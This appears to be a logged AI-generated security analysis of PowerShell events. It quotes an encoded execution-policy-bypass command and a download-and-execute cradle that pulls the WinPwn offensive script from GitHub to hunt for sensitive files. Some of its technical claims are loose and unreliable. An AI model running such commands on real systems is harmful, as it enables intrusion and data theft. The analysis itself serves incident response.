{"file":"filtering\/phi4-mini\/attack\/20250606_143748.jsonl","analysis":"Okay, let's break down this log data. It looks like a series of PowerShell-related events, likely indicating suspicious activity. Here's a categorized analysis and what the key takeaways are:\n\n**1. Initial PowerShell Activity & File Downloads (Likely Shellcode Execution)**\n\n*   **Repeated `powershell.exe -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA'`:** This is a very suspicious pattern.  Let's unpack it.\n    *   `-exec bypass`:  This is a *critical* flag. It bypasses PowerShell's execution policy. This means the script could run even if the user doesn't have permission to normally run PowerShell scripts. This is a huge red flag.\n    *   `-e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA`: This is encoded PowerShell code (likely Base64 encoded).  It's designed to be obfuscated and difficult to read directly.  Decoding this code would reveal the malicious script's instructions.\n    *   **This sequence repeats multiple times. This is extremely suspicious.** It shows a persistent effort to execute the same potentially malicious script.\n\n*   **File Downloads\/Sensitive File Access:** The presence of  `sensitivefiles -noninteractive -consoleoutput` in the last two entries reveals a script attempting to find sensitive information on the system, then likely attempting to exfiltrate this information. The `-noninteractive` flag makes the script silent, preventing any user prompts or feedback.\n\n**2. Further Details & Concerns**\n\n*   **Engine Lifecycle & Provider Lifecycle:**  The \"Engine Lifecycle\" and \"Provider Lifecycle\" events are associated with PowerShell scripts. These events represent the initialization and termination of PowerShell components. This means the scripts are being fully loaded and initialized.\n*   **GitHub Download:** The final two entries `powershell.exe & {iex(new-object net.webclient).downloadstring('https:\\\/\\\/raw.githubusercontent.com\\\/S3cur3Th1sSh1t\\\/WinPwn\\\/121dcee26a7aca368821563cbe92b2b5638c5773\\\/WinPwn.ps1')\\nsensitivefiles -noninteractive -consoleoutput}` specifically downloads a PowerShell script named \"WinPwn.ps1\" directly from a GitHub repository.\n    *   **GitHub Repository:**  The fact that the code is sourced from GitHub requires thorough investigation of the repositoryâ€™s contents and owner's reputation. The repository itself may be legitimate but have been compromised, or it could be a malicious repository.\n    *   **`iex`**:  The `iex` command (Invoke-Expression) executes a string as PowerShell code. This is a dangerous operation, especially when the string comes from an external source (like a web download).\n    *   **WinPwn.ps1**: Research this script name. \"WinPwn\" is a common term related to privilege escalation and exploitation. This is a very concerning script to download and execute.\n\n**Summary & Recommendations**\n\n*   **This is very likely a malicious PowerShell attack.** The combination of bypassed execution policies, obfuscated scripts, downloading from GitHub, the use of `iex`, and the script name \"WinPwn\" all point to a serious compromise.\n*   **Immediate Containment is Required:**\n    *   **Isolate Affected Systems:** Disconnect affected machines from the network to prevent further spread.\n    *   **Endpoint Detection and Response (EDR):**  Utilize EDR solutions to scan and clean the system.\n    *   **Antivirus\/Antimalware:** Run full system scans with up-to-date antivirus and antimalware software.\n    *   **Investigate Network Traffic:** Analyze network traffic for any unusual connections or data exfiltration attempts.\n*   **Root Cause Analysis:**\n    *   **Determine the Initial Infection Vector:** How did the PowerShell script first get onto the system? (Phishing email, malicious website, vulnerability exploitation, etc.)\n    *   **Identify the Compromised Account:** Which user account was used to run the PowerShell script?\n    *   **Review PowerShell Execution Policies:** Enforce stricter PowerShell execution policies to prevent unauthorized scripts from running.\n    *   **User Awareness Training:** Educate users about the dangers of phishing emails and malicious websites.\n*   **Decode and Analyze the Obfuscated Script:**  If possible, decode the Base64-encoded PowerShell code (`SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA`). This will help understand exactly what the script is designed to do.\n* **Examine the GitHub Repository:** Thoroughly inspect the \"S3cur3Th1sSh1t\" GitHub repository and associated credentials.\n\n\n\n**Disclaimer:** This is based on the limited information provided in the log data. A more thorough investigation is required to fully understand the scope of the compromise. Please consult with security professionals for assistance."}
